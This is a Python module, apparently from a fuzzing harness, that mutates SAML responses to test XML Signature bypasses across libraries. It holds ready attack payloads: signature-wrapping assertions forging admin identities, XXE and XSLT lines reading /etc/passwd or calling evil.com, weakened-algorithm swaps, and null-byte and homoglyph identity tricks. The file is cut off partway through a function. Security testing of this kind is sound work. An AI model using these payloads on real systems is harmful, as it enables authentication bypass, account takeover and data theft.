"""SAML XML Signature taxonomy-driven mutator — differential bypass edition.

Encodes structural attack patterns from the SAML vulnerability taxonomy
into a semantic-level mutator.  Each strategy targets a specific bypass
category proven effective against real-world SAML libraries.

Taxonomy sections mapped to strategies:
  S1   XSW1-8 Signature Wrapping       -> xsw_* strategies
  S2   Parser Differentials             -> dual_parser, attr_pollution, doctype_attlist
  S3   Canonicalization Exploitation    -> void_c14n, comment_digest, comment_sigvalue
  S4   Signature Validation Bypass      -> sig_strip, self_signed, algo_downgrade, hmac_confusion
  S5   XML Injection & Entity Attacks   -> xxe_inject, entity_expansion, xslt_inject
  S6   Protocol-Level Attacks           -> nameid_spoof, audience_bypass, timestamp_manip
  S7   Cryptographic Infrastructure     -> golden_saml_pattern
  S8   Implementation-Specific Flaws    -> libxml2_cache, xmlcrypto_firstchild,
                                           samlify_xpath, rexml_quirk
"""

from __future__ import annotations

import logging
import os
import re
import random
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

_log = logging.getLogger(__name__)

# ── Post-mutation re-signing infrastructure ──────────────────────
#
# Group B strategies modify signed content (NameID, Audience, etc.)
# and NEED re-signing so parsers don't reject at sig-check boundary.
#
# Group A strategies that modify Signature internals (S3/S4/S7) would
# have their effects undone by re-signing, so they BLOCK it.

_FIXTURES_DIR = os.path.join(
    os.path.dirname(__file__), os.pardir, os.pardir, os.pardir,
    "targets", "saml_fixtures",
)

# ── Re-signing action per strategy (name-based, index-independent) ──
#
# "needs": Strategy modifies signed content → re-sign to cross sig boundary
# "blocks": Strategy modifies Signature internals → re-sign would undo it
# Strategies not listed are neutral (neither need nor block re-signing).
_RESIGN_ACTION: dict[str, str] = {
    # S2: parser differentials that modify Assertion tag/content
    "attr_pollution": "needs",
    "namespace_redeclaration": "needs",
    "namespace_undeclare": "needs",
    "processing_instruction_inject": "needs",
    "namespace_prefix_remap": "needs",
    # S3: canonicalization/transform
    "comment_inject_digest": "blocks",
    "comment_inject_sigvalue": "blocks",
    "transform_chain_inject": "blocks",
    "transform_remove_enveloped": "blocks",
    "reference_uri_empty": "blocks",
    "reference_uri_xpointer": "blocks",
    "reference_scope_rebind": "blocks",
    "c14n_method_swap": "blocks",
    # S4: signature validation bypass
    "sig_strip_all": "blocks",
    "sig_strip_assertion": "blocks",
    "algo_downgrade": "blocks",
    "hmac_confusion": "blocks",
    "duplicate_reference": "blocks",
    "keyinfo_confusion": "blocks",
    "signedinfo_manipulation": "blocks",
    # S6: protocol-level (modify Assertion internals)
    "nameid_spoof": "needs",
    "audience_bypass": "needs",
    "timestamp_manipulation": "needs",
    "issuer_spoof": "needs",
    "subject_confirmation_bypass": "needs",
    "condition_manipulation": "needs",
    "attribute_injection": "needs",
    # S7: crypto infrastructure
    "golden_saml_self_signed": "blocks",
    # S1: XSW4 modifies NameID inside signed assertion
    "xsw4_assertion_swap": "needs",
    # S8: Go quirk (adds attrs to Assertion)
    "go_encoding_xml_quirk": "needs",
    # S3: void c14n (modifies Assertion xmlns → needs re-sign to test exc-c14n)
    "void_c14n_relative_ns": "needs",
    # G: CVE gap strategies
    "void_c14n_precomputed_digest": "blocks",
    # H: newly discovered (modify NameID/Issuer text)
    "unicode_normalization": "needs",
    "null_byte_inject": "needs",
    # I: extraction divergence (modify NameID structure)
    "nameid_mixed_content": "needs",
    "multi_nameid": "needs",
    # J: breakthrough consensus
    "saml11_namespace_downgrade": "needs",
    "signature_relocation_to_response": "blocks",
    # K: SAMLStorm variant strategies (modify Signature internals)
    "digestvalue_leading_comment": "blocks",
    "digestvalue_cdata_wrap": "blocks",
    "digestvalue_split_comment": "blocks",
    "sigvalue_multi_comment": "blocks",
    "digestvalue_pi_inject": "blocks",
    # L: C14N edge case strategies (modify assertion content)
    "c14n_superfluous_ns": "needs",
    "c14n_inherited_ns": "needs",
    "c14n_attr_value_normalization": "needs",
    "c14n_default_vs_prefixed_ns": "needs",
    "c14n_xml_inherited_attrs": "needs",
    # M: Novel attack vector (modifies transform chain)
    "xpath_transform_exclude_subject": "blocks",
    # N: Gap-derived
    "digestmethod_only_downgrade": "blocks",
    "unicode_identity_confusion": "needs",
    "xslt_pre_verification_transform": "blocks",
    "void_c14n_enhanced": "needs",
    # O: XML-DSig spec-derived (§4.3, §4.4, §5.1)
    "signedinfo_c14n_swap": "blocks",
    "transform_remove_c14n": "blocks",
    "xpointer_comment_preservation": "blocks",
    "hmac_truncation_attack": "blocks",
    "manifest_reference_inject": "blocks",
    "reference_dual_target": "blocks",
    "keyinfo_keyname": "blocks",
    "keyinfo_retrieval_method": "blocks",
    "reference_type_manifest": "blocks",
    # P: C14N / XPath Filter spec-derived
    "c14n_prefixlist_inject": "blocks",
    "c14n_qname_in_attrvalue": "needs",
    "c14n_xml_attr_ancestor": "needs",
    "c14n_default_ns_switch": "needs",
    "c14n_2_0_algorithm_swap": "blocks",
    # Q: SAML Core/Profiles spec-derived
    "subject_confirmation_sender_vouches": "needs",
    "authz_decision_inject": "needs",
    "sso_expired_signed": "needs",
    # R: XPath Filter 2.0 spec-derived
    "xpath_filter2_subtract_conditions": "blocks",
    "xpath_filter2_union_evil": "blocks",
    "xpath_filter2_multi_step": "blocks",
}

# ── Evil NameID values for injection ─────────────────────────────

EVIL_NAMEIDS = [
    b"admin@example.com",
    b"admin",
    b"root@example.com",
    b"superuser@example.com",
    b"ceo@company.com",
    b"ADMIN@EXAMPLE.COM",
    b"system",
]

# ── XSW templates (S1) ──────────────────────────────────────────

# XSW wrapper: wraps evil assertion around content
XSW_ASSERTION_TEMPLATE = (
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
    b' Version="2.0" ID="_evil_{EVIL_ID}"'
    b' IssueInstant="2025-01-01T00:00:00Z">'
    b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
    b"<saml:Subject>"
    b"<saml:NameID>{EVIL_NAMEID}</saml:NameID>"
    b"</saml:Subject>"
    b"</saml:Assertion>"
)

# Extensions wrapper for XSW7
XSW_EXTENSIONS_PREFIX = b"<samlp:Extensions>"
XSW_EXTENSIONS_SUFFIX = b"</samlp:Extensions>"

# Object wrapper for XSW8
XSW_OBJECT_PREFIX = b"<ds:Object>"
XSW_OBJECT_SUFFIX = b"</ds:Object>"

# ── Comment injection payloads (S3-3 SAMLStorm) ─────────────────

COMMENT_DIGEST_PAYLOADS = [
    # Inject comment into DigestValue — xml-crypto firstChild bug
    b"<!-- -->",
    b"<!--FORGED-->",
    b"<!-- evil_digest_here -->",
    b"<!--47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=-->",
]

COMMENT_SIGVALUE_PAYLOADS = [
    b"<!-- -->",
    b"<!--FORGED_SIGNATURE-->",
    b"<!-- evil_sig -->",
]

# ── Namespace manipulation payloads (S2/S3) ──────────────────────

RELATIVE_NAMESPACE_URIS = [
    b'xmlns:evil="1"',
    b'xmlns:evil="relative/path"',
    b'xmlns:ns1="foo"',
    b'xmlns:x=""',
    b'xmlns=""',
]

NAMESPACE_REDECLARATIONS = [
    b'xmlns:saml="http://evil.com/saml"',
    b'xmlns:samlp="http://evil.com/samlp"',
    b'xmlns:ds="http://evil.com/xmldsig"',
    b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
    b'xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
]

# ── DOCTYPE payloads (S2-3 / S5-1) ──────────────────────────────

DOCTYPE_PAYLOADS = [
    # ATTLIST injection for REXML differential (CVE-2025-25291)
    b'<!DOCTYPE samlp:Response [\n'
    b'  <!ATTLIST saml:Assertion xmlns:saml CDATA '
    b'"urn:oasis:names:tc:SAML:2.0:assertion">\n]>\n',
    # Entity declaration for namespace override
    b'<!DOCTYPE samlp:Response [\n'
    b'  <!ATTLIST saml:Assertion ID CDATA "evil_id">\n]>\n',
    # XXE file read
    b'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n',
    # OOB XXE
    b'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://evil.com/steal">\n]>\n',
    # Parameter entity
    b"<!DOCTYPE foo [\n  <!ENTITY % pe SYSTEM "
    b'"http://evil.com/pe.dtd">\n  %pe;\n]>\n',
]

# ── Algorithm URIs (S4-3) ────────────────────────────────────────

WEAK_SIG_ALGORITHMS = [
    b"http://www.w3.org/2000/09/xmldsig#rsa-sha1",
    b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256",
    b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha1",
    b"http://www.w3.org/2000/09/xmldsig#hmac-sha1",
    b"none",
    b"",
]

WEAK_DIGEST_ALGORITHMS = [
    b"http://www.w3.org/2000/09/xmldsig#sha1",
    b"http://www.w3.org/2001/04/xmldsig-more#md5",
]

# ── Encoding payloads (S2-NEW) ───────────────────────────────────

ENCODING_BOMS = [
    b"\xff\xfe",           # UTF-16 LE BOM — Go rejects, libxml2 auto-detects
    b"\xfe\xff",           # UTF-16 BE BOM
    b"\xef\xbb\xbf",       # UTF-8 BOM (benign but different code paths)
]

ENCODING_DECLARATIONS = [
    b'<?xml version="1.0" encoding="UTF-16"?>',
    b'<?xml version="1.0" encoding="UTF-7"?>',
    b'<?xml version="1.0" encoding="ISO-8859-1"?>',
    b'<?xml version="1.0" encoding="US-ASCII"?>',
    b'<?xml version="1.0" encoding="windows-1252"?>',
]

# ── Transform chain payloads (S3-NEW) ────────────────────────────

EXTRA_TRANSFORMS = [
    b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
    b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2"'
    b' Filter="intersect">//*</XPath></ds:Transform>',
    b'<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#WithComments"/>',
    b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#base64"/>',
]

# ── Reference URI payloads (S3-NEW) ──────────────────────────────

REFERENCE_URI_PAYLOADS = [
    b"",                           # whole document
    b"#",                          # empty fragment
    b"xpointer(/)",                # XPointer root — Go unsupported
    b"xpointer(id('_evil'))",      # XPointer by ID
    b"#_wrong_id",                 # non-existent ID
]

# ── Namespace undeclaration payloads (S2-NEW) ────────────────────

NAMESPACE_UNDECLARATIONS = [
    b'xmlns:saml=""',              # XML 1.0 error, some parsers accept
    b'xmlns:ds=""',
    b'xmlns:samlp=""',
    b'xmlns=""',                   # undeclare default namespace
]

# ── Canonicalization algorithm payloads (S3-NEW) ─────────────────

C14N_ALGORITHMS = [
    b"http://www.w3.org/TR/2001/REC-xml-c14n-20010315",
    b"http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments",
    b"http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
    b"http://www.w3.org/2006/12/xml-c14n11",
    b"http://www.w3.org/2006/12/xml-c14n11#WithComments",
    b"http://www.w3.org/2010/xml-c14n2",              # C14N 2.0 (Note, not Rec)
    b"",
]

# ── Protocol-level payloads (S6-NEW) ─────────────────────────────

EVIL_ISSUERS = [
    b"https://evil-idp.com",
    b"",
    b"*",
    b"https://idp.example.com/../../admin",
    b"null",
]

SUBJECT_CONFIRMATION_METHODS = [
    b"urn:oasis:names:tc:SAML:2.0:cm:holder-of-key",
    b"urn:oasis:names:tc:SAML:2.0:cm:sender-vouches",
    b"",
    b"urn:evil",
]

# ── XPath Filter 2.0 payloads (spec-derived) ──────────────────
XPATH_FILTER2_SUBTRACT_PAYLOADS = [
    # Exclude Conditions from digest (allow expired assertions)
    (
        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        b'//saml:Conditions'
        b'</XPath></ds:Transform>'
    ),
    # Exclude Subject (allow NameID modification)
    (
        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        b'//saml:Subject'
        b'</XPath></ds:Transform>'
    ),
    # Exclude AttributeStatement
    (
        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="subtract"'
        b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
        b'//saml:AttributeStatement'
        b'</XPath></ds:Transform>'
    ),
]

XPATH_FILTER2_UNION_PAYLOADS = [
    # Union: include additional evil content in digest scope
    (
        b'<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
        b'<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2" Filter="union">'
        b'//*'
        b'</XPath></ds:Transform>'
    ),
]

# ── Manifest template (xmldsig-core §5.1) ─────────────────────
MANIFEST_TEMPLATE = (
    b'<ds:Object xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
    b'<ds:Manifest Id="_manifest_001">'
    b'<ds:Reference URI="#{REF_URI}">'
    b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
    b'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
    b'</ds:Reference>'
    b'</ds:Manifest>'
    b'</ds:Object>'
)

# ── KeyInfo alternative payloads (xmldsig-core §4.4) ──────────
KEYINFO_KEYNAME_PAYLOADS = [
    b"<ds:KeyInfo><ds:KeyName>idp-signing-key</ds:KeyName></ds:KeyInfo>",
    b"<ds:KeyInfo><ds:KeyName>default</ds:KeyName></ds:KeyInfo>",
    b"<ds:KeyInfo><ds:KeyName>*</ds:KeyName></ds:KeyInfo>",
    b"<ds:KeyInfo><ds:KeyName></ds:KeyName></ds:KeyInfo>",
]

KEYINFO_RETRIEVAL_PAYLOADS = [
    b'<ds:KeyInfo><ds:RetrievalMethod URI="#_cert_object"'
    b' Type="http://www.w3.org/2000/09/xmldsig#X509Data"/></ds:KeyInfo>',
    b'<ds:KeyInfo><ds:RetrievalMethod URI=""'
    b' Type="http://www.w3.org/2000/09/xmldsig#rawX509Certificate"/></ds:KeyInfo>',
]

# ── HMAC truncation payloads (xmldsig-core §4.3.2) ────────────
HMAC_TRUNCATION_LENGTHS = [
    b"<ds:HMACOutputLength>1</ds:HMACOutputLength>",
    b"<ds:HMACOutputLength>8</ds:HMACOutputLength>",
    b"<ds:HMACOutputLength>32</ds:HMACOutputLength>",
    b"<ds:HMACOutputLength>80</ds:HMACOutputLength>",
]

# ── AuthzDecisionStatement payload (saml-core §2.7.2.2) ───────
AUTHZ_DECISION_STATEMENT = (
    b'<saml:AuthzDecisionStatement Resource="https://sp.example.com/admin"'
    b' Decision="Permit">'
    b'<saml:Action Namespace="urn:oasis:names:tc:SAML:1.0:action:rwedc">'
    b'Read</saml:Action>'
    b'</saml:AuthzDecisionStatement>'
)

# ── C14N 2.0 parameter payloads ───────────────────────────────
C14N2_PARAMS = [
    b'<c14n2:InclusiveNamespaces xmlns:c14n2="http://www.w3.org/2010/xml-c14n2"'
    b' PrefixList="saml ds"/>',
    b'<c14n2:PrefixRewrite xmlns:c14n2="http://www.w3.org/2010/xml-c14n2">'
    b'sequential</c14n2:PrefixRewrite>',
    b'<c14n2:TrimTextNodes xmlns:c14n2="http://www.w3.org/2010/xml-c14n2">'
    b'true</c14n2:TrimTextNodes>',
]

EVIL_ATTRIBUTES = [
    b'<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>',
    b'<saml:Attribute Name="email"><saml:AttributeValue>admin@example.com</saml:AttributeValue></saml:Attribute>',
    b'<saml:Attribute Name="groups"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>',
]

# ── Processing instruction payloads (S2-NEW) ─────────────────────

PI_PAYLOADS = [
    b"<?xml-stylesheet type='text/xsl' href='http://evil.com/steal.xsl'?>",
    b"<?evil data?>",
    b"<?xpacket?>",
]

# ── Whitespace injection payloads (S2-NEW) ───────────────────────

WHITESPACE_INJECTIONS = [
    b"\r\n",
    b"\r",
    b"\x0b",       # vertical tab
    b"\x0c",       # form feed
    b"\x00",       # null byte
    b"\t\t",
    b"\xc2\xa0",   # UTF-8 NBSP
]

# ── Go encoding/xml quirk payloads (S8-NEW) ──────────────────────

GO_QUIRK_PAYLOADS = [
    (b' ID="_evil_go"', b"duplicate_attr"),        # duplicate attr — Go keeps last
    (b' xmlns="urn:evil:default"', b"default_ns"),  # default NS injection
]

# ── XSLT payloads (S5-3) ────────────────────────────────────────

XSLT_PAYLOADS = [
    (
        b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
        b'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
        b'<xsl:template match="/">'
        b'<xsl:value-of select="unparsed-text(\'/etc/passwd\')"/>'
        b"</xsl:template></xsl:stylesheet></ds:Transform>"
    ),
    (
        b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
        b'<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">'
        b'<xsl:template match="/">'
        b'<xsl:value-of select="document(\'http://evil.com/ssrf\')"/>'
        b"</xsl:template></xsl:stylesheet></ds:Transform>"
    ),
]

# ── Full-structure evil assertion (G1: CVE-2026-25922) ────────────

XSW_FULL_EVIL_ASSERTION_TEMPLATE = (
    b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
    b' Version="2.0" ID="_evil_{EVIL_ID}"'
    b' IssueInstant="2026-01-01T00:00:00Z">'
    b"<saml:Issuer>https://idp.example.com</saml:Issuer>"
    b"<saml:Subject>"
    b'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
    b"{EVIL_NAMEID}</saml:NameID>"
    b'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
    b'<saml:SubjectConfirmationData NotOnOrAfter="2030-12-31T23:59:59Z"'
    b' Recipient="https://sp.example.com/acs"/>'
    b"</saml:SubjectConfirmation>"
    b"</saml:Subject>"
    b'<saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">'
    b"<saml:AudienceRestriction>"
    b"<saml:Audience>https://sp.example.com</saml:Audience>"
    b"</saml:AudienceRestriction>"
    b"</saml:Conditions>"
    b'<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">'
    b"<saml:AuthnContext>"
    b"<saml:AuthnContextClassRef>"
    b"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"
    b"</saml:AuthnContextClassRef>"
    b"</saml:AuthnContext>"
    b"</saml:AuthnStatement>"
    b"</saml:Assertion>"
)

# ── Reserved NS attributes (G3: CVE-2025-66567) ──────────────────

RESERVED_NS_ATTRS = [
    b' xml:xmlns="http://www.w3.org/2000/09/xmldsig#"',
    b' xml:xmlns="urn:oasis:names:tc:SAML:2.0:assertion"',
    b' xmlns:xml="http://www.w3.org/XML/1998/namespace"',
    b' xml:xmlns="#"',
]

# ── Namespace-prefixed duplicate ID attrs (G5: Fragile Lock) ──────

NS_PREFIXED_ID_ATTRS = [
    b' saml:ID="_evil_dup"',
    b' samlp:ID="_evil_dup"',
    b' ds:ID="_evil_dup"',
    b' xsi:ID="_evil_dup"',
]

# ── StatusDetail wrapper for G2 (CVE-2025-54369) ─────────────────

XSW_STATUSDETAIL_PREFIX = b"<samlp:StatusDetail>"
XSW_STATUSDETAIL_SUFFIX = b"</samlp:StatusDetail>"

# ── Unicode normalization payloads (H1: NEW) ─────────────────────
# NFC→NFD decomposition: visually identical but different byte sequence.
# Some parsers normalize on comparison, others compare raw bytes.
# c14n does NOT mandate Unicode normalization → potential digest bypass.

UNICODE_NORMALIZATION_PAIRS = [
    # (original bytes, replacement bytes, description)
    # NFC → NFD decomposition: é → e + combining acute
    (b"\xc3\xa9", b"\x65\xcc\x81", b"e-acute-nfd"),
    # NFC → NFD: ö → o + combining diaeresis
    (b"\xc3\xb6", b"\x6f\xcc\x88", b"o-umlaut-nfd"),
    # NFC → NFD: ñ → n + combining tilde
    (b"\xc3\xb1", b"\x6e\xcc\x83", b"n-tilde-nfd"),
    # Homoglyph: @ (U+0040) → ＠ (U+FF20 fullwidth)
    (b"@", b"\xef\xbc\xa0", b"fullwidth-at"),
    # Homoglyph: a (U+0061) → а (U+0430 Cyrillic)
    (b"a", b"\xd0\xb0", b"cyrillic-a"),
    # Homoglyph: e (U+0065) → е (U+0435 Cyrillic)
    (b"e", b"\xd0\xb5", b"cyrillic-e"),
    # Homoglyph: o (U+006F) → о (U+043E Cyrillic)
    (b"o", b"\xd0\xbe", b"cyrillic-o"),
    # NFKC mapping: ℀ (U+2100) → a/c
    (b"a", b"\xe2\x84\x80", b"account-of"),
    # Zero-width characters: insert ZWSP (U+200B) or ZWJ (U+200D)
    (b"@", b"@\xe2\x80\x8b", b"zwsp-after-at"),
    (b".", b".\xe2\x80\x8d", b"zwj-after-dot"),
]

# ── Null byte injection payloads (H2: NEW) ───────────────────────
# C parsers (libxml2) may truncate at null; Java/Python preserve full string.

NULL_BYTE_PAYLOADS = [
    b"\x00",                    # raw null byte
    b"&#0;",                    # numeric character reference (XML 1.0 illegal)
    b"&#x0;",                   # hex character reference
    b"\x00admin@evil.com",      # null prefix
    b"admin@evil.com\x00",      # null suffix (C-string truncation)
    b"admin\x00@example.com",   # null in middle
]

# ── Multi-signature payloads (H3: NEW) ───────────────────────────
# Second signature at Response level or duplicated assertion sig.
# Tests which signature takes precedence across implementations.

FAKE_RESPONSE_SIGNATURE = (
    b'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
    b"<ds:SignedInfo>"
    b'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
    b'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
    b'<ds:Reference URI="">'
    b"<ds:Transforms>"
    b'<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
    b'<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
    b"</ds:Transforms>"
    b'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
    b"<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>"
    b"</ds:Reference>"
    b"</ds:SignedInfo>"
    b"<ds:SignatureValue>AAAAAAAAAAAAAAAAAAAAAA==</ds:SignatureValue>"
    b"</ds:Signature>"
)

# ── Regex patterns for locating XML elements ─────────────────────

_RE_ASSERTION_OPEN = re.compile(
    rb"<saml:Assertion\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_ASSERTION_CLOSE = re.compile(rb"</saml:Assertion\s*>", re.IGNORECASE)
_RE_SIGNATURE_OPEN = re.compile(
    rb"<ds:Signature\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_SIGNATURE_CLOSE = re.compile(rb"</ds:Signature\s*>", re.IGNORECASE)
_RE_RESPONSE_OPEN = re.compile(
    rb"<samlp:Response\b[^>]*>", re.IGNORECASE | re.DOTALL
)
_RE_RESPONSE_CLOSE = re.compile(rb"</samlp:Response\s*>", re.IGNORECASE)
_RE_DIGEST_VALUE = re.compile(
    rb"(<ds:DigestValue>)(.*?)(</ds:DigestValue>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIGNATURE_VALUE = re.compile(
    rb"(<ds:SignatureValue>)(.*?)(</ds:SignatureValue>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIG_METHOD = re.compile(
    rb'(<ds:SignatureMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_DIGEST_METHOD = re.compile(
    rb'(<ds:DigestMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_NAMEID = re.compile(
    rb"(<saml:NameID\b[^>]*>)(.*?)(</saml:NameID>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_AUDIENCE = re.compile(
    rb"(<saml:Audience>)(.*?)(</saml:Audience>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_NOTONORAFTER = re.compile(
    rb'(NotOnOrAfter=")(.*?)(")', re.IGNORECASE
)
_RE_TRANSFORMS = re.compile(
    rb"(<ds:Transforms>)(.*?)(</ds:Transforms>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_KEYINFO = re.compile(
    rb"(<ds:KeyInfo>)(.*?)(</ds:KeyInfo>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_XML_DECL = re.compile(rb"<\?xml\b[^?]*\?>")
_RE_EXTENSIONS = re.compile(
    rb"(<samlp:Extensions>)(.*?)(</samlp:Extensions>)",
    re.IGNORECASE | re.DOTALL,
)
# ── New regex patterns for expanded strategies ────────────────────
_RE_ENVELOPED_TRANSFORM = re.compile(
    rb'<ds:Transform\s+Algorithm="http://www\.w3\.org/2000/09/xmldsig#enveloped-signature"\s*/?>',
    re.IGNORECASE | re.DOTALL,
)
_RE_REFERENCE_URI = re.compile(
    rb'(<ds:Reference\s+URI=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_C14N_METHOD = re.compile(
    rb'(<ds:CanonicalizationMethod\s+Algorithm=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_ISSUER = re.compile(
    rb"(<saml:Issuer>)(.*?)(</saml:Issuer>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SUBJECT_CONFIRMATION = re.compile(
    rb'(<saml:SubjectConfirmation\s+Method=")(.*?)(")',
    re.IGNORECASE | re.DOTALL,
)
_RE_NOTBEFORE = re.compile(
    rb'(NotBefore=")(.*?)(")', re.IGNORECASE
)
_RE_RECIPIENT = re.compile(
    rb'(Recipient=")(.*?)(")', re.IGNORECASE
)
_RE_REFERENCE_BLOCK = re.compile(
    rb"(<ds:Reference\b[^>]*>)(.*?)(</ds:Reference>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_ATTRIBUTE_STATEMENT_CLOSE = re.compile(
    rb"(</saml:AttributeStatement>)", re.IGNORECASE
)
_RE_X509_CERT = re.compile(
    rb"(<ds:X509Certificate>)(.*?)(</ds:X509Certificate>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_SIGNED_INFO = re.compile(
    rb"(<ds:SignedInfo>)(.*?)(</ds:SignedInfo>)",
    re.IGNORECASE | re.DOTALL,
)

_RE_CONDITIONS = re.compile(
    rb"(<saml:Conditions\b[^>]*>)(.*?)(</saml:Conditions>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_AUTHN_STATEMENT = re.compile(
    rb"(<saml:AuthnStatement\b[^>]*>)(.*?)(</saml:AuthnStatement>)",
    re.IGNORECASE | re.DOTALL,
)
_RE_C14N_TRANSFORM = re.compile(
    rb'<ds:Transform\s+Algorithm="(http://www\.w3\.org/2001/10/xml-exc-c14n#)"',
    re.IGNORECASE | re.DOTALL,
)

# Precomputed empty-string SHA-256 digest (base64)
EMPTY_SHA256_B64 = b"47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="

MAX_OUTPUT_SIZE = 100_000


def _make_evil_assertion(rng: random.Random, sentinel: bytes | None = None) -> bytes:
    """Build an unsigned evil assertion with a sentinel or random NameID.

    When *sentinel* is provided it is used as the NameID so the oracle can
    later verify that the accepting library extracted the attacker-controlled
    identity (HIGH exploit_confidence).
    """
    evil_id = rng.randbytes(8).hex().encode()
    nameid = sentinel if sentinel is not None else rng.choice(EVIL_NAMEIDS)
    return (
        XSW_ASSERTION_TEMPLATE
        .replace(b"{EVIL_ID}", evil_id)
        .replace(b"{EVIL_NAMEID}", nameid)
    )


def _find_element_span(
    data: bytes,
    open_re: re.Pattern[bytes],
    close_re: re.Pattern[bytes],
) -> tuple[int, int] | None:
    """Find the byte range of the first matching element (open..close)."""
    m_open = open_re.search(data)
    if not m_open:
        return None
    m_close = close_re.search(data, m_open.end())
    if not m_close:
        return None
    return (m_open.start(), m_close.end())


# ── Lazy-loaded re-signing state (module-level singleton) ────────
# Avoids repeated key reads and signer construction per mutation.

_resign_key: object | None = None      # Pre-loaded RSAPrivateKey object
_resign_cert: list | None = None       # Pre-loaded x509 cert list
_resign_key_pem: bytes | None = None   # Raw PEM for fallback
_resign_cert_pem: bytes | None = None  # Raw PEM for fallback
_resign_signer: object | None = None
_resign_init_failed: bool = False

_SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
_DS_NS = "http://www.w3.org/2000/09/xmldsig#"


def _get_signer():
    """Return a cached (key_obj, cert_list, XMLSigner) tuple, or None.

    Pre-loads the PEM key into an RSAPrivateKey object so that
    signxml.sign() does not call load_pem_private_key on every
    invocation (~100ms per call on Windows).
    """
    global _resign_key, _resign_cert, _resign_signer, _resign_init_failed
    global _resign_key_pem, _resign_cert_pem
    if _resign_init_failed:
        return None
    if _resign_signer is not None:
        return _resign_key, _resign_cert, _resign_signer

    try:
        key_path = os.path.join(_FIXTURES_DIR, "idp_key.pem")
        cert_path = os.path.join(_FIXTURES_DIR, "idp_cert.pem")
        with open(key_path, "rb") as f:
            _resign_key_pem = f.read()
        with open(cert_path, "rb") as f:
